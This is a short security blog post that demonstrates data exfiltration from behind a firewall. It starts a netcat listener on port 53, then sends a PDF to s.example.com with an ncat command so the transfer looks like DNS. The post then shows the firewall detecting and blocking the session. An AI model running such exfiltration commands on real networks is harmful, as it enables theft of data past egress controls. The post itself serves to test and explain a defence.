---
layout: post
title:  "Application Firewall Data Exfiltration"
date:   2020-03-14 14:11:15 -0400
categories: exfiltration 
---
<p>
Once an environment has been compromised and the adversary finds some desirable data the data needs to be removed from the network. In this use case we will assume that common protocols like FTP and SSH are heavily restricted on egress traffic (as they should be) so a simple listener will be open on the DNS port which is more commonly permitted.
</p>

<h3>Step 1 - Start the Listener</h3>

<p>
In this example the listener is being run on a Linux host outside of the firewall.
</p>

<p>nc is like a networking swiss army knife, -l means listen, -p specifies port 53, and > data indicates to store all of the data received in a file called data.
</p>
<br>
<code>
  nc -l -p 53 > data
</code>
<br>
<br>
<img src="/images/exfiltration-netcat-destination.png" alt="netcat">

<h3>Step 2 - Send a File</h3>

<p>
From a blue host behind the firewall run netcat.
</p>

<p>
This time netcat is being run with --send-only which only allows sending to the target, the target is s.example.com, the port is 53 to appear as DNS, and < rp_DBIR_2017_Report_en_xg.pdf sends that PDF over the channel.
</p>
<br>

<code>
  ncat --send-only s.example.com 53 < rp_DBIR_2017_Report_en_xg.pdf
</code>
<br>
<br>
<img src="/images/exfiltration-netcat-source.png" alt="netcat">


<h3>Step 3 - View the Results</h3>

<p>
After several seconds we see that the sending device ends the session with "broken pipe", meaning something happened to the session and it ended. This could be from the target, source, or something in between.
</p>

<p>
Looking at the following NGFW log we can see that the NGFW prevented the session. It determined that the traffic is not actually DNS and instead identified it as psiphon, which is not permitted in any policy.
</p>
<br>
<br>
<img src="/images/exfiltration-netcat-ngfwlog.png" alt="ngfw">



